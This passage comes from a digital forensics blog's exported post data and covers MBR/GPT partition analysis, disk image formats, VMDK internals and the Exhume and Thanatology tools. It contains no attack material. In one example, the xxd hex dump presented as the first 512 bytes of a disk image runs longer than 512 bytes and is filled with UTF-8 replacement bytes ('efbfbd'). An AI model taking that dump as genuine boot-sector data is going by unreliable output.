section.\\n\\n### The GPT Partition entries\\n\\nEach partition entry in GPT includes a Globally Unique Identifier (GUID), a partition name, and CRC32 checksums for integrity verification that make GPT more robust and resistant to corruption than MBR. It also has attributes that can give us more specific information about the kind of filesystem and operating system we are dealing with.\\n\\n![](../images/thanatology-3/7.svg)\\n\\nGPT is now the default partitioning method for Windows, Linux, and macOS on UEFI-enabled hardware. However you can and you will still find a lot of MBR.\\n\\n## Exhume Partitions: Disk Layout Investigation\\n\\nWe integrated MBR/EBR and GPT partition investigation capabilities into the Exhume ToolKit inside the \\"exhume_partitions\\" module. Let\'s see how you can investigate a disk image layout using the CLI.\\n\\nAfter installing [exhume partitions](https://www.forensicxlab.com/docs/exhume_partitions/getting-started), we can view the different options we can pass to the program using the `--help` argument.\\n\\n![](../images/thanatology-3/8.png)\\n\\nLet\'s investigate a corrupted GPT Disk Image. In this case the main GPT Header at LBA 1 is no longer available. On the screenshot bellow, we can see the GPT Signature that is suppoed to be \\"EFI PART\\" in ASCII was modified to corrupt it.\\n\\n![](../images/thanatology-3/9.png)\\n\\nExhume as the capability to try to parse the backup GPT header and entries if the LBA 1 metadata are corrupted. Let\'s witness it by using exhume_partition on this disk image.\\n\\n![](../images/thanatology-3/10.png)\\n\\nWe can see that the tool identified the PMBR, and didn\'t successfully parse the GPT signature. It as reverted to the backup Header thus making the parsing possible.\\n\\n### JSON output\\n\\nLet\'s now say we want to use this output for our custom tool. We can use the `--json` argument to have the results of the disk layout in JSON. In the example bellow, we pipe the resulted output into jq to fetch some interesting info.\\n\\n![](../images/thanatology-3/11.png)\\n\\n\\n### Using as a library\\n\\nLike all Exhume modules, you can use it as a library in your own rust based tools ! Learn more with the documentation: https://www.forensicxlab.com/docs/exhume_partitions/library\\n\\n## Conclusion\\n\\nWe now have a new exhume module builded on top of Exhume Body to discover the layout of a disk image. In the next blogpost, we will dive into the forensic of the Extended FileSystem with Exhume ExtFS! We hope you enjoyed and learn things about MBR and GPT ! Join us on Discord if you want to participate to the project."},{"id":"thanatology-2","metadata":{"permalink":"/blog/thanatology-2","source":"@site/blog/2025-06-30-thanatology-2/index.md","title":"\ud83e\udd89 Thanatology part 2: Multiple disk images formats handling using the Exhume ToolKit","description":"This blogpost is part of the Thanatology blogpost series. If you haven\u2019t check it out, I recommend reading the following first:","date":"2025-06-30T00:00:00.000Z","tags":[{"inline":true,"label":"Thanatology","permalink":"/blog/tags/thanatology"},{"inline":true,"label":"Exhume","permalink":"/blog/tags/exhume"},{"inline":true,"label":"Digital Forensics","permalink":"/blog/tags/digital-forensics"}],"readingTime":11.21,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"thanatology-2","title":"\ud83e\udd89 Thanatology part 2: Multiple disk images formats handling using the Exhume ToolKit","authors":["k1nd0ne"],"tags":["Thanatology","Exhume","Digital Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83e\udd89 Thanatology part 3: MBR and GPT forensics with the Exhume ToolKit.","permalink":"/blog/thanatology-3"},"nextItem":{"title":"\ud83d\udd26 A quick walkthrough in the VMDK format","permalink":"/blog/vmdk"}},"content":"This blogpost is part of the Thanatology blogpost series. If you haven\u2019t check it out, I recommend reading the following first:\\n-\\t[Thanatology part 1: Introduction to the Thanatology project](https://www.forensicxlab.com/blog/thanatology)\\n\\n\\n In this blogpost, we will dive into the concepts of disk images and how digital forensics examiners can use the [Exhume toolkit](https://www.forensicxlab.com/docs/exhume) to read data transparently from different formats. First, we will give an overview of what is a disk image and describe some of the existing formats one may encounter during a digital investigation. Next, we will explore how Exhume Body is providing an abstraction layer to those formats to read data agnostically.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Disk images in digital forensics\\n\\nA disk image is a **complete** copy of the contents of a digital storage device, such as a hard drive, solid-state drive (SSD), USB stick, CD/DVD, Virtual Machine, etc. It captures every bit of data stored on the device, including user files, system files, and even hidden or deleted information. In digital forensics, disk images are crucial because they allow investigators to preserve and analyze data without altering the original evidence. By working from an image rather than the actual device, forensic analysts ensure the integrity of the evidence is maintained, which is essential for legal proceedings and maintaining a chain of custody.\\n\\n### Logical Vs Physical Acquisitions\\n\\nThere are two primary types of acquisitions in digital forensics: **physical acquisition** and **logical acquisition**.\\n\\nPhysical acquisition involves creating a bit-for-bit copy of the entire storage device, including slack space, unallocated space, and hidden partitions. This type of acquisition is more comprehensive and enables deeper forensic analysis, such as recovering deleted files or analyzing remnants of previously stored data.\\n\\n![](../images/thanatology-2/diskimg1.svg)\\n\\n\\n**Logical acquisition**, on the other hand, captures only the files and directories visible to the operating system. While faster and less storage-intensive, logical acquisition may miss important data that resides outside the active file system, making it less thorough for forensic purposes.\\n\\nChoosing between logical and physical acquisition depends mostly on the context of the digital forensic investigation case. However a chain of custody must be respected in each case, documenting the actions taken before, during and after the acquisition.\\n\\n![](../images/thanatology-2/diskimg2.svg)\\n\\n\\n### The disk image formats ecosystem\\n\\nWhen performing a full acquisition of a disk (whether it is a physical disk or an existing disk image from a Virtual Environnement for example without compression) you will always need to store the forensic copy on a storage device that possess at least the same storage capacity as the source disk copy you have to make. The storage capacity is increasing with the years which means the need to find ways to compress those images to be able to store more data was growing. That\u2019s where some new disk image formats come into play.\\n\\n\\nSeveral disk image formats can be used digital forensic investigations, each with specific features and use cases. The most common formats include raw (dd), Expert Witness Format (EWF or. E01), and Advanced Forensic Format (AFF). The raw format is a simple sector-by-sector copy of the drive and is widely supported due to its simplicity and universality. However, it does not include metadata or compression which can be a bummer when facing situations with terabytes of data. EWF, developed by Guidance Software, is widely used in professional forensic environments because it supports metadata storage (like case number, examiner notes), compression, and integrity checks. If you are interested in EWF, we made a blogpost about it. AFF is an open-source format designed to be flexible and extensible while also supporting compression and metadata. The choice of format often depends on the tools available, the complexity of the case, and the need for efficient storage and documentation.\\n\\n**Last but not least**: the Virtual Disk Image formats like qcow, qcow2, vmdk , vdi, vhd or vhdx are used primarily for virtualization and emulation. Not all these formats come with compressions, but the layout is different for each and require parsing operations to obtain raw data sectors. Digital forensics examiner can also encounter such disk image format when seizing a virtual machine for example that is stored within the building of a cloud provider service. The difference (and sometimes advantage) when stepping upon such cases is that the disk image relevant for the case is already there, it functions just like a physical disk image would in a traditional forensic context. This allows to directly parse the file system, recover deleted files, analyze partition structures, and perform low-level searches without the physical disk extraction and digital copy phase. Virtual disk image also often has the capability of storing snapshots which can be very valuable for the investigator to be able to retrieve data that changed in time. If you are interested about those disk image formats, we made a [blogpost about VMDK](https://www.forensicxlab.com/blog/vmdk).\\n\\n### What are we left with?\\n\\nWhen investigators deal with disk images in multiple formats, the main problem faced is compatibility and interoperability across forensic tools and workflows. Each image format has its own structure, metadata handling, compression method, and supported features, which can create significant challenges during analysis, validation, and evidence handling. The usual methodology to maximize compatibility is often to use tools and operations to convert those specific disk images into raw disk images that can later be ingested into forensics toolkits, but it can be time consuming and even generate data-loss.\\n\\n## Exhume Body: Disk Image data abstraction\\n\\nExhume Body is one of the core components of the Exhume Tool Suite. It is one of the foundation modules which is trying to provide an agnostic disk image data abstraction layer for file system forensics. It is providing a way to read and seek through multiple disk image formats like if it was contiguous sectors of data like a raw image. Exhume body is designed to understand these multiple disk image formats and to perform the parsing and potential decompression operations on the fly when requesting data.\\n\\n![](../images/thanatology-2/exhume.svg)\\n\\nExhume Body is enabling the user to read and seek through data. Like most of the Exhume modules, the user can use either the command line interface or as a library.  Let us now show some practical examples.\\n\\n### Using Exhume Body with the CLI\\n\\nAfter [installing exhume](https://www.forensicxlab.com/docs/exhume_body/getting-started), we can provide the tool with the location of the target disk image, the number of bytes to read and an offset. Optionally, we can precise the format of the disk image. If no format is specified, the tool will try to discover the format automatically.\\n\\n![](../images/thanatology-2/exhume_body.svg)\\n\\nIn the following output, we are reading the first sector (512 bytes) of an EWF Linux disk image we would like to investigate. We will pipe the result inside xxd.\\n\\n```\\n[2025-06-15T09:32:08Z INFO  exhume_body] Processing the file \'disk.E01\' in \'auto\' format...\\n[2025-06-15T09:32:08Z INFO  exhume_body] Detected an EWF disk image.\\n[2025-06-15T09:32:08Z INFO  exhume_body] Evidence : disk.E01\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf] EWF File Information:\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf] Number of Segments: 1\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf] Acquisition Metadata:\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Case Number: OSDFCon Workshop VM1\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Evidence Number: 001\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Description: Compromised Webserver\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Examiner: Ali Hadi\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Notes:\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Application Version: ADI3.4.2.2\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   OS Version: Win 201x\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Acquisition Date: 2019 10 6 17 58 15\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   System Date: 2019 10 6 17 58 15\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Password Hash: 0\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Reserved: f\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf] Volume Information:\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Chunk Count: 1032260\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Sectors Per Chunk: 64 (32768 bytes)\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Bytes Per Sector: 512\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Total Sector Count: 66064608\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf] Chunk Information:\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Segment Number: 1\\n[2025-06-15T09:32:08Z INFO  exhume_body::ewf]   Number of Chunks: 1032260\\n00000000: efbf bd63 efbf bd10 efbf bdd0 bc00 efbf  ...c............\\n00000010: bdef bfbd 0000 efbf bdd8 8eef bfbd efbf  ................\\n00000020: bdef bfbd 007c efbf bd00 06ef bfbd 0002  .....|..........\\n00000030: efbf bdef bfbd 2106 0000 efbf bdef bfbd  ......!.........\\n00000040: 0738 0475 0bef bfbd efbf bd10 efbf bdef  .8.u............\\n00000050: bfbd efbf bd07 75ef bfbd efbf bd16 efbf  ......u.........\\n00000060: bd02 efbf bd01 efbf bd00 7cef bfbd efbf  ..........|.....\\n00000070: bdef bfbd 7401 efbf bd4c 02ef bfbd 13ef  ....t....L......\\n00000080: bfbd 007c 0000 efbf bdef bfbd 0000 0000  ...|............\\n00000090: 0000 0000 0000 0000 0000 0000 efbf bd01  ................\\n000000a0: 0000 0000 0000 00ef bfbd efbf bdef bfbd  ................\\n000000b0: efbf bdef bfbd c280 7405 efbf bdef bfbd  ........t.......\\n000000c0: 7074 02ef bfbd efbf bdef bfbd 797c 0000  pt..........y|..\\n000000d0: 31ef bfbd efbf bdd8 8ed0 bc00 20ef bfbd  1........... ...\\n000000e0: efbf bd64 7c3c efbf bd74 02ef bfbd efbf  ...d|<...t......\\n000000f0: bd52 efbf bd17 04ef bfbd 0703 7406 efbf  .R..........t...\\n00000100: bdef bfbd 7def bfbd 1701 efbf bd05 7cef  ....}.........|.\\n00000110: bfbd 41ef bfbd efbf bd55 efbf bd13 5a52  ..A......U....ZR\\n00000120: 723d efbf bdef bfbd 55ef bfbd 7537 efbf  r=......U...u7..\\n00000130: bdef bfbd 0174 3231 efbf bdef bfbd 4404  .....t21......D.\\n00000140: 40ef bfbd 44ef bfbd efbf bd44 02ef bfbd  @...D......D....\\n00000150: 0410 0066 efbf bd1e 5c7c 66ef bfbd 5c08  ...f....\\\\|f...\\\\.\\n00000160: 66ef bfbd 1e60 7c66 efbf bd5c 0cef bfbd  f....`|f...\\\\....\\n00000170: 4406 0070 efbf bd42 efbf bd13 7205 efbf  D..p...B....r...\\n00000180: bd00 70ef bfbd 76ef bfbd 08ef bfbd 1373  ..p...v........s\\n00000190: 0d5a efbf bdef bfbd 0fef bfbd efbf bd00  .Z..............\\n000001a0: efbf bdef bfbd 7def bfbd 0066 0fef bfbd  ......}....f....\\n000001b0: c688 64ef bfbd 4066 efbf bd44 040f efbf  ..d...@f...D....\\n000001c0: bdef bfbd efbf bdef bfbd 02ef bfbd efbf  ................\\n000001d0: bdef bfbd 40ef bfbd 4408 0fef bfbd efbf  ....@...D.......\\n000001e0: bdef bfbd efbf bd02 66ef bfbd 0466 efbf  ........f....f..\\n000001f0: bd60 7c66 09ef bfbd 754e 66ef bfbd 5c7c  .`|f....uNf...\\\\|\\n00000200: 6631 efbf bd66 efbf bd34 efbf bdef bfbd  f1...f...4......\\n00000210: 31ef bfbd 66ef bfbd 7404 3b44 087d 37ef  1...f...t.;D.}7.\\n00000220: bfbd efbf bdef bfbd efbf bd30 efbf bdef  ...........0....\\n00000230: bfbd efbf bd02 08ef bfbd efbf bdef bfbd  ................\\n00000240: 5aef bfbd c6bb 0070 efbf bdef bfbd 31db  Z......p......1.\\n00000250: b801 02ef bfbd 1372 1eef bfbd efbf bd60  .......r.......`\\n00000260: 1eef bfbd 0001 efbf bdef bfbd 31ef bfbd  ............1...\\n00000270: efbf bd00 efbf bdef bfbd efbf bdef bfbd  ................\\n00000280: efbf bd1f 61ef bfbd 265a 7cef bfbd efbf  ....a...&Z|.....\\n00000290: bd7d efbf bd03 efbf bdef bfbd 7def bfbd  .}..........}...\\n000002a0: 3400 efbf bdef bfbd 7def bfbd 2e00 efbf  4.......}.......\\n000002b0: bd18 efbf bdef bfbd 4752 5542 2000 4765  ........GRUB .Ge\\n000002c0: 6f6d 0048 6172 6420 4469 736b 0052 6561  om.Hard Disk.Rea\\n000002d0: 6400 2045 7272 6f72 0d0a 00ef bfbd 0100  d. Error........\\n000002e0: efbf bd0e efbf bd10 efbf bd3c 0075 efbf  ...........<.u..\\n000002f0: bdef bfbd 40ef bfbd 0200 0000 efbf bd20  ....@..........\\n00000300: 2100 efbf bd1a 3b1f 0008 0000 00ef bfbd  !.....;.........\\n00000310: 0700 003b 1b1f 05ef bfbd efbf bdef bfbd  ...;............\\n00000320: efbf bdef bfbd 0700 0268 efbf bd03 0000  .........h......\\n00000330: 0000 0000 0000 0000 0000 0000 0000 0000  ................\\n00000340: 0000 0000 0000 0000 0000 0000 0000 55ef  ..............U.\\n00000350: bfbd 0a                                  ...\\n```\\n\\nWe can witness in the logs that exhume_body successfully retrieved the metadata about the EWF disk image and gave us the bytes we have requested. That is good if you want to dump some specific data from a specific offset to later analyse it in an other tool for example.\\n\\n\\n### Using Exhume Body as a Library\\n\\nOne use-case you might have the need to automate a specific parsing task from a disk image. If you are willing to program in rust (you should), you can use exhume_body as a library to perform the task you want. Here is an example.\\n\\n```rust\\nuse exhume_body::Body;\\nuse std::io::{Read, Seek, SeekFrom};\\n\\nfn main() {\\n    // Enable log output (optional)\\n    env_logger::Builder::new()\\n        .filter_level(log::LevelFilter::Info)\\n        .init();\\n\\n    // Open the evidence file \u2014 let Exhume auto-detect the image format\\n    let mut body = Body::new(\\"/path/to/evidence.E01\\".to_string(), \\"auto\\");\\n\\n    // Dump some high-level metadata to the log\\n    body.print_info();\\n\\n    // Seek to byte offset 0x200\\n    body.seek(SeekFrom::Start(0x200)).expect(\\"seek failed\\");\\n\\n    // Read the next 0x400 bytes (1 KiB)\\n    let mut buffer = vec![0u8; 0x400];\\n    body.read_exact(&mut buffer).expect(\\"read failed\\");\\n\\n    println!(\\"Read {} bytes; first 16 bytes: {:02x?}\\", buffer.len(), &buffer[..16]);\\n}\\n\\n```\\n\\n## Conclusion\\n\\nExhume body is a powerfull module of the Exhume toolkit and is one of the core libary used for many other modules and part of the Thanatology project. In the next blogpost we will cover MBR and GPT partition analysis using Exhume Partitions ! Join us on Discord if you want to participate to the project."},{"id":"vmdk","metadata":{"permalink":"/blog/vmdk","source":"@site/blog/2025-06-14-vmdk/index.md","title":"\ud83d\udd26 A quick walkthrough in the VMDK format","description":"After attending a conference for incident response teams, I joined a project aiming to create a forensic framework allowing acquisition and visualization of evidence from various sources: the Exhume toolkit.","date":"2025-06-14T00:00:00.000Z","tags":[{"inline":true,"label":"VMDK","permalink":"/blog/tags/vmdk"},{"inline":true,"label":"Exhume","permalink":"/blog/tags/exhume"},{"inline":true,"label":"Digital Forensics","permalink":"/blog/tags/digital-forensics"}],"readingTime":9.96,"hasTruncateMarker":true,"authors":[{"name":"mickaelwalter","title":"Infosec and technology enthousiast","url":"https://github.com/MickaelWalter/","page":{"permalink":"/blog/authors/mickaelwalter"},"socials":{"x":"https://x.com/mickaelwalter","github":"https://github.com/MickaelWalter","bluesky":"https://bsky.app/profile/mickaelwalter.bsky.social"},"imageURL":"https://www.mickaelwalter.fr/content/images/2020/05/hackerman-profile.png","key":"mickaelwalter"}],"frontMatter":{"slug":"vmdk","title":"\ud83d\udd26 A quick walkthrough in the VMDK format","authors":["mickaelwalter"],"tags":["VMDK","Exhume","Digital Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83e\udd89 Thanatology part 2: Multiple disk images formats handling using the Exhume ToolKit","permalink":"/blog/thanatology-2"},"nextItem":{"title":"\ud83e\udd89 Thanatology Part 1 - Introducing the Thanatology project","permalink":"/blog/thanatology"}},"content":"After attending a conference for incident response teams, I joined a project aiming to create a forensic framework allowing acquisition and visualization of evidence from various sources: the Exhume toolkit.\\n\\n[The Exhume Toolkit v0.1](https://www.forensicxlab.com/docs/exhume)\\n\\nIn this quest of retrieving data from various base formats, I got involved in the understanding and implementation of a parser for the VMDK format.\\n\\nThe Virtual Machine Disk format has been created by VMware and is used by all kinds of virtual machines from all types of hypervisors. It is also used in exchange formats used to share virtual machines from one hypervisor to another.\\n\\nMost IT experts, from cybersecurity to system administrators have heard of VMDK files. And I am no exception. But I never really understood what was behind this format. Sure, I did encounter some difficulties to access data from a VMDK file sourced from and ESXi server but I always found tools allowing to convert the file to a better suited format... Including VMDK itself.\\n\\nAt that moment I wondered why converting a VMDK file to another one could help me get access to the data for forensic purposes. And I\'ve found the answer now I did some serious research on the matter.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\nA format of formats\\n===================\\n\\nThe VMDK is not one file format by itself but rather a collection of formats depending on the configuration set up for the virtual machine. Many parameters can have an impact on the way the virtual machine data will be stored:\\n\\n*   Whether the disk is thin provisioned or not\\n*   Whether the disk image is stored in a file, a full hardware disk or a partitioned disk\\n*   Whether the disk is divided in several files or not\\n*   Whether the data is compressed or not\\n*   Whether the file represents a snapshot or a full disk\\n\\nAt the beginning, there is one thing in common for all formats: the descriptor file.\\n\\nThe descriptor file bears its name well and contains the metadata about a VMDK disk allowing to read and write data to the virtual disk.\\n\\nIt is a text description, usually in a separate text file, of various parameters related to the disk itself: disk ID, adapter type, but most importantly a list of references to what is described as extents.\\n\\nExtents are the actual files, disks or partitions containing the data on the virtual disk. They can be of various forms determined by a parameter specified on each line.\\n\\n![](https://www.mickaelwalter.fr/content/images/2025/06/image-2.png)\\n\\nTypical scenario of a descriptor file and its associated extents\\n\\nA descriptor file can look like this:\\n\\n```\\n    # Disk DescriptorFile\\n    version=1\\n    encoding=\\"UTF-8\\"\\n    CID=fffffffe\\n    parentCID=ffffffff\\n    createType=\\"twoGbMaxExtentFlat\\"\\n\\n    # Extent description\\n    RW 2097152 FLAT \\"Disque virtuel 2-f001.vmdk\\" 0\\n\\n    # The Disk Data Base\\n    #DDB\\n\\n    ddb.adapterType = \\"lsilogic\\"\\n    ddb.geometry.cylinders = \\"512\\"\\n    ddb.geometry.heads = \\"128\\"\\n    ddb.geometry.sectors = \\"32\\"\\n    ddb.longContentID = \\"d0f5e5f69fcd0241f710a9dcfffffffe\\"\\n    ddb.uuid = \\"60 00 C2 96 41 d4 0c 4b-bc 3a 43 31 4c d0 b4 09\\"\\n    ddb.virtualHWVersion = \\"21\\"\\n```\\n\\nThe descriptor file above specifies a disk of type `2GbMaxExtentFlat`. This means that the disk is built around extent files of maximum 2GB that contain the actual data in a flat manner (the disk data is stored in a raw form). The extent description section will notably describe the number of sectors of 512 bytes for each extent and the start sector of the extent (here 2 097 152 sectors starting at sector 0).\\n\\nSo, we have a type for the disk as a whole and a type for each extent individually. It starts with a mess for newcomers, isn\'t it?\\n\\nI won\'t dive in details on disk types. Mostly they will give a bit more details on the reasons extents are segmented in a certain way (in a single file or not, full disk, partition, etc.).\\n\\nWhat interests me the most today is the way data is stored in the extents. Extents can also be one of several types:\\n\\n*   Flat : the data is stored as is in the file\\n*   Sparse : the data is stored in \\"grains\\" allowing to allocate only what\'s necessary\\n*   Zero : there is no data, just zeros (in this case, no extent path is specified)\\n*   VMFS : somewhat similar to flat but on ESXi servers\\n*   VMFSSparse : a sparse variant for ESXi servers\\n*   And others I won\'t dive in today\\n\\nThe VMDK descriptor is usually in the `<name>.vmdk` file. Extents can be in other files such as `<name>-flat.vmdk`, `<name>-f001.vmdk`, or `<name>-s001.vmdk`.\\n\\nLet\'s dive in the different extent types.\\n\\nFlat, VMFS and Zero\\n===================\\n\\nFlat and VMFS extent types are basically the same type. They store raw data in the extent. That is, if you read data at byte 0 of the first extent, you will read the first byte of the virtual disk itself.\\n\\nThere can be some hiccups when the disk is segmented in several files in terms of how offsets must be handled (because the file is not starting at sector 0) but that\'s it.\\n\\n![](https://www.mickaelwalter.fr/content/images/2025/06/image-3.png)\\n\\nIn the case of flat extents, data is stored sequentially and can be accessed by determining which sector must be retrieved. Knowing the sector number allows to determine the proper extent file and the proper offset inside the file itself\\n\\nFlat and VMFS files cannot be thin provisioned and the combined size of such extents will be exactly the capacity of the disk with zeros located in places that have not been written yet. There is no header, no metadata including in the extents. Only the disk data.\\n\\nFlat and VMFS files always have a separate plaintext descriptor file and are easy to identify through it as it is easy to open in a regular text editor.\\n\\nThe zero extent is only a virtual extent spitting out zeros.\\n\\nSparse\\n======\\n\\nThe sparse extent types appear when a disk is thin provisioned (when the size of the disk specified at the virtual machine creation is not fully allocated immediately).\\n\\nThe sparse extent files are binary files following a specific format. They start with the \\"KDMV\\" magic bytes (VDMK in little endian) and a header that will indicate the top-level metadata needed to read the file.\\n\\nIt is important to note that a sparse extent file is segmented in blocks of 512 bytes. As such, the header is 512 bytes long with padding to fill up the whole sector. All subsequent references in the file are specified in terms of sectors of this size.\\n\\nThere is a special case in `monolithicSparse` disks where the VMDK descriptor is not in a separate file but is embedded directly into the sparse extent file. In this case, the sparse file header will give the sector number where to locate the descriptor and the sector count it will take\\n\\nThe header of a sparse file contains a lot of metadata related to the way the data is organized. This is necessary because the disk contents are not organized sequentially.\\n\\n![](https://www.mickaelwalter.fr/content/images/2025/06/image-4.png)\\n\\n# Overview of the structure of a sparse file\\n\\nTo allow full understanding of this overview, we have to dive in the nature of a grain.\\n\\nA grain is a group of sectors. The number of the sectors grouped in a grain is specified by a parameter in the header (it is usually set to 128).\\n\\nSo, in a sparse file the disk data is split in blocks of several 512-byte long sectors. Grains in which no data has been written are not provisioned (sparse grain) in the file and the corresponding entry in the grain table is set to 0 indicating that any byte retrieved from it should be 0.\\n\\nLet\'s talk about the grain directory and the grain table.\\n\\nThe grain directory is a list of sector numbers pointing to various grain tables that can be placed anywhere in the sparse file. Each grain table will point to the first sector (relative to the start of the file and not the disk in this case) of the corresponding grain in the file.\\n\\nIn the grain directory and grain tables, grains are sorted in the same order as on the actual disk: the first entry of the first table pointed by the directory is the first sector of the disk part sliced in this sparse file (remember that a extent file does not necessarily start at sector 0 of the disk).\\n\\nAll the sectors of a provisioned grain are written fully in the file. A typical example of that is the sector 0 of a disk partitioned with a Master Boot Record. The MBR is usually 512-byte long. In this case, the grain 0 is provisioned and will contain data only in the first sector. All the other 127 (in case, the grain size is 128) are often set to 0.\\n\\nThe primary and secondary grain directories usually exist together to ensure resiliency in case of data corruption. Despite this, there are some cases where only the secondary directory should be used. A flag indicates which on to use depending on the case.\\n\\nThe file format explained before has 2 other variants:\\n\\n*   VMFS sparse: similar to the Sparse format but with several Copy-On-Write files\\n*   StreamOptimized sparse file: used in exchange formats such as OVA, this is a sparse file but with grain data compressed (using ZLIB DEFLATE)\\n\\nIn the first case, the file header format changes and contains more metadata allowing a root / children relationship between files.\\n\\nIn the second case, the file also contains markers that allow to read the file sequentially. It is still possible to refer to the data using the contents of the header rather than reading the whole file but it should be taken into account that a marker starts the grain and not the actual data. Moreover, even if when they are decompressed they have a fixed size, the compressed grains can be of variable length and may be the source of irregular repartition of grains in the file.\\n\\nI won\'t dive into these special cases as they work on the same principles as the sparse extent type.\\n\\nRetrieving data for forensic purposes\\n=====================================\\n\\nA challenge encountered by the forensic analyst when working with VMDK file is often to be able to retrieve the disk data in a reproducible and demonstrable way. Most forensic tools require a flat VMDK image to be able to work on the data. And you now see why this is the case.\\n\\nHowever, flat images are not the norm as disks are most of the time thin provisioned to spare disk space on the host. This requires a conversion of the VMDK files to a monolithic flat one.\\n\\nVMware (now Broadcom) provides such conversion tools but they are mostly closed source and there is no warranty of the integrity of data.\\n\\nThat\'s okay for most investigations but some require high levels of integrity.\\n\\nIn this case, the most sensible approach is to directly parse the original source without any attempt to convert it. This is the approach I used in my contribution to Exhume Body. It is not a complete coverage of all VMDK formats yet but feedbacks and samples will be useful for me to improve the module.\\n\\nYou can find the source here:\\n\\n[GitHub - forensicxlab/exhume\\\\_body: Exhume a body of data. Supports multiple file formats.](https://github.com/forensicxlab/exhume_body)\\n\\nDon\'t hesitate to rise an issue or PR to improve this module.\\n\\nA bit more documentation\\n========================\\n\\n\\n[libvmdk/documentation/VMWare Virtual Disk Format (VMDK).asciidoc at main \xb7 libyal/libvmdk](https://github.com/libyal/libvmdk/blob/main/documentation/VMWare%20Virtual%20Disk%20Format%20(VMDK).asciidoc)\\n\\n[Virtual Disk Types](https://vdc-download.vmware.com/vmwb-repository/dcr-public/2bba164b-4115-4279-9c99-40f4c14319ad/03a845fc-5345-45de-9a27-31e868d6e751/doc/vddkDataStruct.5.3.html#1020737)\\n\\n[sanbarrow.com](http://sanbarrow.com/vmdk/disktypes.html)\\n\\n[https://venthusiastic.wordpress.com/2014/03/12/vmdk/](https://venthusiastic.wordpress.com/2014/03/12/vmdk/)\\n\\n[Dealing with compressed vmdk files](https://az4n6.blogspot.com/2015/04/dealing-with-compressed-vmdk-files.html)"},{"id":"thanatology","metadata":{"permalink":"/blog/thanatology","source":"@site/blog/2025-06-09-thanatology-1/index.md","title":"\ud83e\udd89 Thanatology Part 1 - Introducing the Thanatology project","description":"In digital forensics, tools are only as valuable as the investigator\u2019s ability to understand and explain their output, especially when presenting evidence in court. Beyond simply extracting data, the methodology behind how artifacts are collected and interpreted plays a critical role in admissibility, reliability and credibility.","date":"2025-06-09T00:00:00.000Z","tags":[{"inline":true,"label":"Thanatology","permalink":"/blog/tags/thanatology"},{"inline":true,"label":"Exhume","permalink":"/blog/tags/exhume"},{"inline":true,"label":"Digital Forensics","permalink":"/blog/tags/digital-forensics"}],"readingTime":9.33,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"thanatology","title":"\ud83e\udd89 Thanatology Part 1 - Introducing the Thanatology project","authors":["k1nd0ne"],"tags":["Thanatology","Exhume","Digital Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83d\udd26 A quick walkthrough in the VMDK format","permalink":"/blog/vmdk"},"nextItem":{"title":"\ud83d\udce6 Volatility3 : Import Address Table","permalink":"/blog/voliat"}},"content":"In digital forensics, tools are only as valuable as the investigator\u2019s ability to understand and explain their output, especially when presenting evidence in court. Beyond simply extracting data, the methodology behind how artifacts are collected and interpreted plays a critical role in admissibility, reliability and credibility.\\n\\n\\nThis blog post series introduces the Thanatology Project, an open-source, cross-platform digital forensics framework currently under development. Built on top of the Exhume ToolKit (a modular set of Rust-based forensic tools), Thanatology combines performance, transparency, and modern design via a Tauri-based desktop interface.\\nDesigned for law enforcement and digital forensic professionals, the project emphasizes not only artifact collection and presentation but will also try to provide help for interpretation.\\n\\nFor example, when analyzing EXTFS file systems, Thanatology will try to offers guidance on timestamp meanings and includes complete extraction details suitable for annexing to formal reports.\\n\\nThe blog series will cover:\\n- An overview of the Thanatology project and its goals.\\n- A high-level introduction to the Exhume tool suite.\\n- Deep dives into each Exhume module and its specific forensic use case.\\n- Updates on the project development.\\n- Interesting research techniques we found during our journey.\\n\\n\\nWhile Thanatology is not intended to replace established tools, it will attempt to offers a modular and modern alternative ideal for cross-verifying findings or integrating into custom workflows. This blogpost series is mainly here to provide the community with updates, technical knowledge and any interesting subjects we found along the way.\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n## Purpose and motivations\\n\\nWorking in the digital forensics field for a while now. I am amazed to witness many investigators using tools without being able to answer some critical questions in front of court, thus making the whole work sometimes worthless. Here are some critical questions that could pop up during review:\\n\\n-\\tWhat is the artefact?\\n-\\tWhere did it come from?\\n-\\tHow was it 